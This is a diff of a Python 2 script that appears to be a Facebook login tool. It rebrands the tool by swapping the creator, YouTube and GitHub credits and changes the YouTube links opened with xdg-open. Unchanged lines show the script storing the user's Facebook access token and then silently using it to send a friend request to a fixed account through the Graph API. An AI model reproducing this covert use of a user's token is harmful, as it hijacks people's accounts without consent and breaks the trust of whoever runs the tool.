@@ -56,9 +56,9 @@ logo = """
 \033[1;31m█████████      \033[1;92m«----------✧----------»
 \033[1;32m ██ ██
 \033[1;37m╔═══════════════════════════════════════════════════╗
-\033[1;37m║\033[1;96m* \033[1;93mCreator  \033[1;93m:\033[1;36mANBIA\033[1;93m                            \033[1;36m      ║
-\033[1;37m║\033[1;96m* \033[1;93mYoutube \033[1;93m :\033[1;37m\033[4mSANSBAE\033[0m\033[1;93m \033[1;36m                               ║
-\033[1;37m║\033[1;96m* \033[1;97mGitHub   \033[1;93m:\033[1;32mhttps://github.com/SansBae  \033[1;36m           ║
+\033[1;37m║\033[1;96m* \033[1;93mCreator  \033[1;93m:\033[1;36mRizkyMaulanaSidikXD\033[1;93m                            \033[1;36m      ║
+\033[1;37m║\033[1;96m* \033[1;93mYoutube \033[1;93m :\033[1;37m\033[4mRizkyMaulanaS\033[0m\033[1;93m \033[1;36m                               ║
+\033[1;37m║\033[1;96m* \033[1;97mGitHub   \033[1;93m:\033[1;32mhttps://github.com/Rizkyxd  \033[1;36m           ║
 \033[1;37m╚═══════════════════════════════════════════════════╝"""
 
 def tik():
@@ -101,7 +101,7 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "PASSWORD SALAH WOI!"
-            os.system('xdg-open https://www.youtube.com/c/SANSBAE')
+            os.system('xdg-open https://m.youtube.com/channel/UCliEHmQxdnSc9cTOKD32SQA')
 
 def login():
 	os.system('clear')
@@ -142,7 +142,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin successful'
-				os.system('xdg-open https://www.youtube.com/c/SANSBAE')
+				os.system('xdg-open https://m.youtube.com/channel/UCliEHmQxdnSc9cTOKD32SQA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
